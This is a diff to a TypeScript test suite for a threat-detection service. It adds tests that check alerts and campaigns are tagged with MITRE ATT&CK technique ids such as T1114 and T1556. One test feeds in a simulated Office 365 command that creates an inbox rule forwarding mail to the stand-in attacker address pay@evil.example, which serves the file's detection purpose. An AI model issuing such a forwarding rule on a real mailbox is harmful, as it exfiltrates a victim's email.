@@ -29,6 +29,7 @@ import { isPublicAddress, parseAllowlist, AUTO_PER_HOUR } from "../src/blocklist
 import { manipulationSignals } from "../src/ai-safety.js";
 import { parentTechniques } from "../src/campaigns.js";
 import type { User } from "../src/types.js";
+import { THREAT_SIGNS } from "@legion/agent-identity";
 import { issueCredential, sendSigned, type TestCredential } from "./helpers/webhook.js";
 
 let tenantA: string, tenantB: string;
@@ -356,6 +357,16 @@ describe("the seven most dangerous attack types, as they reach Legion", () => {
     expect(await correlationAlerts(tenantA)).toHaveLength(1);
   });
 
+  it("F-11: the alert names the ATT&CK techniques the matched signs prove (forwarding rule T1114, MFA removed T1556)", async () => {
+    await send(credA, hostEvent("o365", 'Office 365: New-InboxRule -Name x -ForwardTo pay@evil.example "UserId": "dana@acme.example"'));
+    const [a] = await correlationAlerts(tenantA);
+    expect(a.mitre_technique).toContain("T1114");
+    const [c] = await campaigns(tenantA);
+    expect(c.techniques).toContain("T1114");
+    await send(credA, hostEvent("o365", 'Azure AD: MFA method removed "UserId": "dana@acme.example"'));
+    expect((await campaigns(tenantA))[0].techniques).toEqual(expect.arrayContaining(["T1114", "T1556"]));
+  });
+
   it("a real Microsoft 365 audit event (no full_log, details in data) is recognised as a mailbox takeover", async () => {
     await send(credA, { provider: "wazuh", event: {
       id: `o365-${randomUUID()}`, rule: { description: "Office 365: Exchange admin activity", level: 5, groups: ["office365"] }, agent: { name: "wazuh-manager" },
@@ -591,5 +602,23 @@ describe("written acknowledgement before automatic blocking", () => {
     await query("UPDATE tenants SET auto_block_ack_version = '0' WHERE id = $1", [tenantA]);
     await plain().send({ mode: "off" }).expect(200);
     expect((await plain().send({ mode: "auto" })).status).toBe(400);   // the notice changed
+  });
+});
+
+describe("F-11: ATT&CK mapping of Legion's own signs", () => {
+  // Strong signs that deliberately name no technique: the text does not prove one.
+  const WITHOUT_TECHNIQUE: Record<string, string> = {
+    integrity_failure: "a failed signature or checksum may be corruption or a bad mirror, not an attack technique",
+  };
+  it("every strong sign names a valid ATT&CK technique id, or is a reviewed exception", () => {
+    for (const sign of THREAT_SIGNS.filter((x) => x.strong)) {
+      if (WITHOUT_TECHNIQUE[sign.id]) { expect(sign.technique).toBeUndefined(); continue; }
+      expect(sign.technique, sign.id).toMatch(/^T\d{4}$/);
+    }
+  });
+  it("weak signs that are too generic name none", () => {
+    for (const id of ["file_change", "overload", "persistence", "software_install"]) {
+      expect(THREAT_SIGNS.find((x) => x.id === id)?.technique, id).toBeUndefined();
+    }
   });
 });
